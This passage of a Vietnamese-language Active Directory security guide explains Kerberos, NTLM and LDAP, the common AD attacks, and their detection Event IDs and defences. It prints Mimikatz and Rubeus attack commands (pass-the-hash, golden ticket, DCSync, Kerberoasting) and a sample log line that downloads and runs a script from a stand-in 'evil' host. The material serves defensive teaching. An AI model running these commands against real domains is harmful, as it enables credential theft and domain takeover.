(&(objectClass=user)(servicePrincipalName=*))     # tìm tài khoản có SPN -> Kerberoast
(userAccountControl:1.2.840.113556.1.4.803:=4194304)  # bit DONT_REQ_PREAUTH -> AS-REP roast
```

`1.2.840.113556.1.4.803` là **matching rule OID LDAP_MATCHING_RULE_BIT_AND** — lọc theo bit của `userAccountControl`.

`userAccountControl` (UAC) flags quan trọng:

| Bit (hex) | Tên | Ý nghĩa |
|-----------|-----|---------|
| 0x0002 | ACCOUNTDISABLE | Tài khoản tắt |
| 0x0200 | NORMAL_ACCOUNT | |
| 0x10000 | DONT_EXPIRE_PASSWORD | |
| 0x400000 (4194304) | DONT_REQ_PREAUTH | Cho AS-REP roasting |
| 0x80000 | TRUSTED_FOR_DELEGATION | Unconstrained delegation (nguy hiểm) |

### 3.8.2. Ví dụ thực tế

```powershell
# Tìm tài khoản có SPN (mục tiêu Kerberoasting) bằng PowerShell native
([adsisearcher]"(&(objectClass=user)(servicePrincipalName=*))").FindAll() |
  ForEach-Object { $_.Properties.samaccountname }
```

```bash
# ldapsearch (Linux) — bind đơn giản rồi truy vấn
ldapsearch -x -H ldap://10.0.0.10 -D "CORP\jdoe" -w 'Passw0rd!' \
  -b "DC=corp,DC=example,DC=com" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

> **Lưu ý bảo mật**: LDAP 389 cleartext lộ bind credential (simple bind). Microsoft khuyến nghị **LDAP signing + channel binding** (LDAPS) để chống MITM/relay. Truy vấn LDAP bất thường (enum toàn bộ user/SPN) là dấu hiệu recon — phát hiện qua audit "Directory Service Access" (Event 4662) hoặc network monitoring.

---

## 3.9. Kerberos — xác thực từng bước

### 3.9.1. Là gì và các thành phần

Kerberos v5 (RFC 4120) là giao thức xác thực mặc định trong AD, dựa trên vé (ticket) và **mã hóa đối xứng**. Thành phần:

- **KDC (Key Distribution Center)** = chạy trên DC, gồm **AS (Authentication Service)** và **TGS (Ticket Granting Service)**.
- **krbtgt**: tài khoản đặc biệt; hash mật khẩu của nó là **key ký TGT**.
- **Principal**: user (`user@REALM`) hoặc service (`HTTP/web01.corp.com`).

Cổng: TCP/UDP **88**.

### 3.9.2. Ba giai đoạn — luồng đầy đủ

```
   CLIENT                         KDC (AS+TGS)                 SERVICE (web01)
     |   (1) AS-REQ  ----------------->|                            |
     |   <----------- (2) AS-REP  (TGT + session key)               |
     |   (3) TGS-REQ (TGT + SPN) ----->|                            |
     |   <----------- (4) TGS-REP (Service ticket + svc key)        |
     |   (5) AP-REQ (Service ticket + Authenticator) -------------->|
     |   <-------------------- (6) AP-REP (optional mutual auth)     |
```

**Giai đoạn 1 — AS-REQ (Authentication Service Request)**

Client gửi tới AS. Trường chính trong `KDC-REQ-BODY`:

| Trường | Ý nghĩa |
|--------|---------|
| `cname` | Tên client (user) |
| `realm` | Realm (domain uppercase) |
| `sname` | Service name = `krbtgt/REALM` |
| `till` | Thời hạn yêu cầu |
| `nonce` | Số ngẫu nhiên chống replay |
| `etype` | Danh sách encryption type ưa thích (AES256=18, AES128=17, RC4=23) |
| `padata` | **PA-ENC-TIMESTAMP**: timestamp mã hóa bằng key dẫn xuất từ mật khẩu user (pre-authentication) |

> **Pre-authentication**: client chứng minh biết mật khẩu bằng cách mã hóa timestamp hiện tại. Nếu một tài khoản tắt pre-auth (UAC bit DONT_REQ_PREAUTH) → AS sẽ trả AS-REP mà không cần chứng minh → **AS-REP roasting**.

**Giai đoạn 2 — AS-REP**

AS trả về:
- **TGT (Ticket-Granting Ticket)**: mã hóa bằng **krbtgt key** → client KHÔNG đọc được nội dung, chỉ cầm. Bên trong chứa session key, danh tính client, và **PAC**.
- **Phần enc-part**: chứa **TGS session key**, mã hóa bằng key của user (client giải được).

Cấu trúc một **Ticket** (KRB_TGT/service ticket, RFC 4120):

```
Ticket ::= [APPLICATION 1] SEQUENCE {
   tkt-vno         [0] INTEGER (5),
   realm           [1] Realm,
   sname           [2] PrincipalName,    -- krbtgt/REALM hoặc SPN
   enc-part        [3] EncryptedData     -- mã hóa bằng key của service/krbtgt
}

EncTicketPart (giải mã ra) ::= {
   flags           -- forwardable, renewable, ...
   key             -- session key
   crealm, cname   -- danh tính client
   authtime, starttime, endtime, renew-till
   authorization-data -- chứa PAC (AD-WIN2K-PAC)
}
```

**Giai đoạn 3 — TGS-REQ**

Client muốn truy cập service `HTTP/web01`. Gửi tới TGS:
- TGT (mà nó không đọc được) trong trường `padata` (AP-REQ wrapper).
- **Authenticator**: timestamp + cname, mã hóa bằng **TGS session key** (lấy từ AS-REP) → chứng minh client sở hữu session key.
- `sname` = `HTTP/web01.corp.com`.

**Giai đoạn 4 — TGS-REP**

TGS giải TGT bằng krbtgt key, lấy session key, kiểm authenticator, rồi cấp **service ticket** mã hóa bằng **hash mật khẩu của tài khoản service** (tài khoản sở hữu SPN). Kèm service session key (mã hóa bằng TGS session key).

> **Kerberoasting** tấn công đây: bất kỳ user nào cũng xin được service ticket cho mọi SPN. Service ticket mã hóa bằng hash của service account → brute-force offline ra mật khẩu service account, nhất là khi etype=RC4 (0x17).

**Giai đoạn 5 — AP-REQ**

Client gửi service ticket + authenticator (mã bằng service session key) tới chính service. Service giải ticket bằng key của mình, lấy session key, kiểm authenticator → xác thực client. Service **không cần liên hệ KDC**.

### 3.9.3. PAC — Privilege Attribute Certificate

PAC (MS-PAC) nhúng trong `authorization-data` của ticket, chứa thông tin ủy quyền:

| Thành phần PAC | Ý nghĩa |
|----------------|---------|
| `KERB_VALIDATION_INFO` (Logon Info) | User SID, **danh sách group SID**, RID, logon time |
| `PAC_CLIENT_INFO` | Tên + thời gian |
| `UPN_DNS_INFO` | UPN |
| `Server Signature` | HMAC ký bằng key của service |
| `KDC Signature` | HMAC ký bằng krbtgt key |

> PAC là cách Windows mang **thông tin nhóm/SID** vào ticket để server quyết định quyền mà không cần truy vấn lại DC. Lỗ hổng **MS14-068** từng cho phép giả PAC (đặt mình vào Domain Admins) vì server signature kiểm tra yếu.

### 3.9.4. Ví dụ thực tế

```cmd
:: Liệt kê vé Kerberos đang cache trong phiên
klist

:: Xóa vé (buộc xin lại) — hữu ích khi debug
klist purge
```

```powershell
# Kerberoasting (Rubeus) — xin TGS cho mọi SPN, xuất hash để crack offline
Rubeus.exe kerberoast /outfile:hashes.txt
# Crack bằng hashcat mode 13100 (Kerberos 5 TGS-REP etype 23/RC4)
# hashcat -m 13100 hashes.txt wordlist.txt
```

> **Phát hiện**: Kerberoasting để lại **Event 4769** với `TicketEncryptionType=0x17` (RC4) và `ServiceName` là tài khoản user-SPN. Nhiều 4769 RC4 trong thời gian ngắn từ một account = báo động.

### 3.9.5. Lưu ý bảo mật tổng hợp Kerberos

- Vô hiệu hóa RC4, ép AES (etype 17/18) làm giảm hiệu quả Kerberoast.
- Service account dùng **gMSA (Group Managed Service Account)** với mật khẩu 120 ký tự tự động xoay → không crack được.
- Đặt `krbtgt` reset 2 lần định kỳ để vô hiệu golden ticket cũ.

---

## 3.10. NTLM — Challenge/Response

### 3.10.1. Cơ chế 3 bước

NTLM (NT LAN Manager) là giao thức cũ, dùng khi không có Kerberos (truy cập bằng IP, máy không join domain, workgroup). Ba message:

```
CLIENT                                   SERVER
  | (1) NEGOTIATE_MESSAGE  ------------->|   (báo khả năng: flags)
  | <----------- (2) CHALLENGE_MESSAGE   |   (server nonce 8 byte)
  | (3) AUTHENTICATE_MESSAGE  ---------->|   (NTLM response = HMAC dựa trên NT hash + challenge)
```

**Type 2 CHALLENGE_MESSAGE** — các trường:

| Offset | Kích thước | Trường | Ý nghĩa |
|--------|-----------|--------|---------|
| 0x00 | 8 byte | Signature | `NTLMSSP\0` (`4E 54 4C 4D 53 53 50 00`) |
| 0x08 | 4 byte | MessageType | `0x00000002` |
| 0x0C | 8 byte | TargetName fields | len/maxlen/offset |
| 0x14 | 4 byte | NegotiateFlags | Các cờ thương lượng |
| 0x18 | 8 byte | **ServerChallenge** | Nonce ngẫu nhiên 8 byte |
| 0x20 | 8 byte | Reserved | |
| 0x28 | 8 byte | TargetInfo fields | AV_PAIR (tên domain, máy...) |

**NTLMv2 response** (trong AUTHENTICATE): client tính
`NTProofStr = HMAC-MD5(NTLMv2Hash, ServerChallenge || blob)`
trong đó `NTLMv2Hash = HMAC-MD5(NT-Hash, uppercase(user) || domain)`. NT-Hash = `MD4(UTF-16LE(password))`.

> **Quan trọng**: Server không bao giờ thấy mật khẩu, chỉ thấy NT hash gián tiếp qua response. Nhưng nếu attacker có **NT hash**, họ tính được response mà không cần mật khẩu → đây chính là cơ sở của **pass-the-hash**.

### 3.10.2. So sánh NTLM vs Kerberos

| Tiêu chí | NTLM | Kerberos |
|----------|------|----------|
| Mô hình | Challenge/response | Ticket (vé) |
| Mutual auth | Không (mặc định) | Có |
| Bên thứ 3 | Không cần (server hỏi DC qua Netlogon) | Cần KDC |
| Dùng IP thay tên | Được | Không (cần SPN/DNS) |
| Replay | Yếu hơn | Có timestamp + nonce |
| Tấn công đặc trưng | Pass-the-hash, NTLM relay | Pass-the-ticket, Kerberoast, golden ticket |

> **Lưu ý**: NTLM authentication tại DC sinh **Event 4776**. NTLM relay (gửi tiếp challenge/response sang máy khác) là tấn công lớn — phòng bằng SMB signing + EPA (Extended Protection for Authentication) + tắt NTLM nơi có thể.

---

## 3.11. Tấn công Active Directory và dấu hiệu Event ID

### 3.11.1. Pass-the-Hash (PtH)

**Cơ chế**: dùng trực tiếp NT hash (không cần plaintext) để hoàn thành NTLM authentication tới dịch vụ từ xa (SMB, WMI).

```cmd
:: Mimikatz: tạo logon session mới mang NT hash
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe
```

**Dấu hiệu**: Event **4624 Logon Type 9** + `LogonProcessName=seclogo` + `AuthenticationPackageName=Negotiate`; thường theo sau là **4624 Type 3** ở máy đích kèm 4672 (privileges).

### 3.11.2. Pass-the-Ticket (PtT)

**Cơ chế**: trích xuất TGT/service ticket từ bộ nhớ rồi inject vào phiên khác.

```cmd
:: Mimikatz: dump rồi nạp lại ticket
sekurlsa::tickets /export
kerberos::ptt [0;abc]-2-0-...-Administrator@krbtgt-CORP.kirbi
```

**Dấu hiệu**: vé Kerberos dùng từ máy/IP không khớp với 4768 ban đầu; thiếu 4768 tương ứng với hoạt động Kerberos.

### 3.11.3. Kerberoasting / AS-REP Roasting

Đã mô tả cơ chế ở 3.9. Tóm tắt dấu hiệu:

| Tấn công | Event | Trường chỉ báo |
|----------|-------|----------------|
| Kerberoasting | 4769 | `TicketEncryptionType=0x17`, ServiceName là user account có SPN |
| AS-REP roasting | 4768 | `PreAuthType=0`, account có UAC bit DONT_REQ_PREAUTH |

```powershell
# AS-REP roasting (Rubeus): tìm account không yêu cầu pre-auth
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# hashcat -m 18200 asrep.txt wordlist.txt
```

### 3.11.4. Golden Ticket và Silver Ticket

| | Golden Ticket | Silver Ticket |
|---|---------------|---------------|
| Giả mạo | TGT | Service ticket |
| Key cần có | **krbtgt NT hash** | NT hash của **service account** |
| Phạm vi | Toàn domain (bất kỳ service) | Một service cụ thể |
| Liên hệ KDC | Không (khi dùng) | Không |
| Phát hiện | Khó (TGT hợp lệ); săn TGT lifetime bất thường, không có 4768 trước 4769 | Tương tự nhưng giới hạn 1 SPN |

```cmd
:: Golden ticket (Mimikatz) — cần krbtgt hash + domain SID
kerberos::golden /user:Administrator /domain:corp.example.com ^
  /sid:S-1-5-21-...-1107 /krbtgt:<krbtgt_NTLM_hash> /ptt
```

> **Lý do golden ticket toàn năng**: TGT được ký bằng krbtgt key. Nếu attacker có krbtgt hash, họ tự phát hành TGT với PAC chứa SID Domain Admins, hạn dùng 10 năm. Chỉ reset krbtgt (2 lần) mới vô hiệu.

### 3.11.5. DCSync

**Cơ chế**: giả làm DC, gọi RPC **DRSUAPI** `DRSGetNCChanges` (`IDL_DRSGetNCChanges`) để yêu cầu replicate dữ liệu bí mật (hash mọi tài khoản, kể cả krbtgt). Cần quyền **Replicating Directory Changes** (+ All) trên domain head.

```cmd
:: Mimikatz: kéo hash của krbtgt qua replication
lsadump::dcsync /domain:corp.example.com /user:krbtgt
```

**Dấu hiệu**: Event **4662** trên DC với `Properties` chứa GUID của control access right:
- `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes)
- `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes-All)
- `89e95b76-444d-4c62-991a-0facbeda640c` (DS-Replication-Get-Changes-In-Filtered-Set)

Khi `AccessMask` chứa các GUID này từ một principal **không phải DC** = DCSync đang diễn ra.

### 3.11.6. Bảng tổng hợp dấu hiệu

| Tấn công | Event ID chính | Chỉ báo cốt lõi |
|----------|----------------|-----------------|
| Pass-the-Hash | 4624 (Type 9), 4776 | LogonProcessName seclogo |
| Pass-the-Ticket | 4624/4769 không khớp 4768 | Ticket dùng từ host lạ |
| Kerberoasting | 4769 | EncType 0x17, SPN user account |
| AS-REP Roasting | 4768 | PreAuthType 0 |
| Golden Ticket | 4769 không có 4768 trước | TGT lifetime bất thường |
| DCSync | 4662 | Replication GUID từ non-DC |
| Service install (PsExec) | 7045, 4697 | binPath lạ |
| Log clear | 1102, 104 | SubjectUserName |

---

## 3.12. PowerShell Logging

### 3.12.1. Ba cấp logging

| Cấp | Event ID / Log | Ghi gì |
|-----|----------------|--------|
| **Module Logging** | 4103 (Microsoft-Windows-PowerShell/Operational) | Pipeline + tham số lệnh theo module |
| **Script Block Logging** | **4104** (cùng log) | Toàn bộ nội dung script block đã **de-obfuscate** trước khi chạy |
| **Transcription** | File text | Toàn bộ input/output ra file |

### 3.12.2. Bật bằng GPO / Registry

```cmd
:: Script Block Logging (mạnh nhất — ghi cả lệnh đã giải mã base64)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" ^
  /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f

:: Module Logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" ^
  /v EnableModuleLogging /t REG_DWORD /d 1 /f

:: Transcription ra file
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" ^
  /v EnableTranscripting /t REG_DWORD /d 1 /f
```

> **Lý do 4104 mạnh**: attacker hay dùng `powershell -enc <base64>` để giấu lệnh. Script Block Logging ghi nội dung **sau khi giải mã**, nên thấy lệnh thật. Event 4104 với `Level=Warning` được engine tự đánh dấu khi phát hiện pattern khả nghi (Invoke-Mimikatz, IEX, DownloadString...).

Một Event 4104 mẫu:

```xml
<EventData>
  <Data Name="MessageNumber">1</Data>
  <Data Name="MessageTotal">1</Data>
  <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')</Data>
  <Data Name="ScriptBlockId">{...}</Data>
</EventData>
```

> **Lưu ý bảo mật**: Attacker downgrade về PowerShell v2 (`powershell -version 2`) để né script block logging (v2 không hỗ trợ). Phòng: gỡ .NET 2.0/PowerShell v2 engine. AMSI (Antimalware Scan Interface) bổ sung quét nội dung script lúc runtime; attacker dùng AMSI bypass → giám sát chuỗi bypass đặc trưng.

---

## 3.13. LAPS và Mô hình phân tầng (Tiering)

### 3.13.1. LAPS — Local Administrator Password Solution

**Vấn đề giải quyết**: mật khẩu admin cục bộ giống nhau trên mọi máy → một PtH lan cả domain. LAPS đặt mật khẩu admin cục bộ **ngẫu nhiên, khác nhau mỗi máy**, lưu trong AD và tự xoay.

**Cơ chế** (LAPS cổ điển):
- Mở rộng schema thêm 2 attribute trên object computer:
  - `ms-Mcs-AdmPwd`: mật khẩu plaintext (bảo vệ bằng ACL — chỉ máy đó ghi, admin được ủy quyền đọc).
  - `ms-Mcs-AdmPwdExpirationTime`: thời điểm hết hạn (FILETIME).
- CSE (client extension) chạy theo GPO: nếu hết hạn → sinh mật khẩu mới, đặt cho admin cục bộ, ghi lên AD.

**Windows LAPS (mới, 2023)**: tích hợp sẵn, lưu attribute `msLAPS-Password`, hỗ trợ **mã hóa mật khẩu** (DPAPI-NG, chỉ nhóm được ủy quyền giải) và lưu cả vào Entra ID.

```powershell
# Đọc mật khẩu LAPS của một máy (cần quyền đã ủy quyền)
Get-AdmPwdPassword -ComputerName WS01            # LAPS cổ điển
Get-LapsADPassword -Identity WS01 -AsPlainText   # Windows LAPS
```

> **Lưu ý bảo mật**: attribute `ms-Mcs-AdmPwd` được bảo vệ bằng ACL + thường đánh dấu "confidential". Phải kiểm tra **không vô tình cấp quyền đọc** cho nhóm rộng. Audit đọc LAPS (Event 4662 trên attribute đó).

### 3.13.2. Mô hình phân tầng (Microsoft Tiering / Enterprise Access Model)

Nguyên tắc: **credential bậc cao không bao giờ chạm máy bậc thấp**.

| Tier | Tài sản | Tài khoản quản trị |
|------|---------|--------------------|
| **Tier 0** | DC, AD CS, ADFS, hệ thống điều khiển danh tính | Domain/Enterprise Admins |
| **Tier 1** | Server, ứng dụng, dữ liệu | Server admin |
| **Tier 2** | Workstation, thiết bị người dùng | Helpdesk/workstation admin |

Quy tắc:
- Admin Tier 0 chỉ đăng nhập vào **Privileged Access Workstation (PAW)** và DC.
- Không dùng tài khoản Tier 0 để RDP vào workstation (vì hash sẽ nằm trong LSASS của máy Tier 2, dễ bị dump).
- Dùng **Authentication Policy Silos** + **Protected Users group** (cấm NTLM, cấm delegation, ép Kerberos AES, không cache credential) cho tài khoản nhạy cảm.

```powershell
# Thêm admin vào Protected Users (chống PtH/PtT cho tài khoản đó)
Add-ADGroupMember -Identity "Protected Users" -Members "tier0-admin"

# Tạo Authentication Policy giới hạn TGT lifetime ngắn
New-ADAuthenticationPolicy -Name "T0-Policy" `
  -UserTGTLifetimeMins 240 -ProtectedFromAccidentalDeletion $true
```

> **Lý do tiering hiệu quả**: phần lớn tấn công AD dựa vào **credential reuse theo chiều ngang/dọc** (lấy hash admin từ một máy bị chiếm rồi dùng lên DC). Cô lập credential theo tier cắt đứt chuỗi này ngay cả khi một máy bị xâm nhập. Protected Users + LSA Protection (`RunAsPPL`) + Credential Guard (cô lập secret trong VBS/VTL1) là lớp phòng thủ kỹ thuật bổ sung chống dump LSASS.

### 3.13.3. Credential Guard và LSA Protection

- **LSA Protection (RunAsPPL)**: chạy `lsass.exe` như **Protected Process Light** → process khác (kể cả admin) không mở handle đọc bộ nhớ → chặn Mimikatz `sekurlsa`.
  ```cmd
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
  ```
- **Credential Guard**: dùng virtualization-based security (Hyper-V VTL1) để cô lập NTLM hash + Kerberos TGT trong **LSAIso** mà LSASS user-mode không truy cập được → PtH/PtT trên máy đó vô hiệu.

> **Phát hiện bypass**: nếu Sysmon Event 10 vẫn thấy handle PROCESS_VM_READ tới lsass.exe khi RunAsPPL bật, nghĩa là attacker đã nạp driver để gỡ bảo vệ PPL (BYOVD) — báo động cao.

---

## 3.14. Tổng kết phòng thủ theo lớp

| Lớp | Biện pháp | Chống lại |
|-----|-----------|-----------|
| Logging | Sysmon + 4688 cmdline + 4104 + WEF→SIEM | Mọi giai đoạn, anti-forensic |
| Credential | LAPS, gMSA, Protected Users, Credential Guard, RunAsPPL | PtH, PtT, dump LSASS |
| Kerberos | Tắt RC4, reset krbtgt, AES, AuthN Policy | Kerberoast, golden ticket |
| Kiến trúc | Tiering, PAW, LAPS | Lateral movement, leo quyền |
| Mạng/giao thức | LDAP signing+CB, SMB signing, tắt NTLM, EPA | LDAP/NTLM relay |
| Giám sát AD | Audit 4662, 4769 EncType, 4624 Type 9 | DCSync, Kerberoast, PtH |

Toàn bộ nội dung trên tạo nền tảng để vận hành phát hiện và đáp ứng sự cố trong môi trường Windows/AD ở mức kỹ thuật chi tiết: từ byte trong hive/ticket/token cho tới event ID cụ thể tương ứng từng kỹ thuật tấn công.
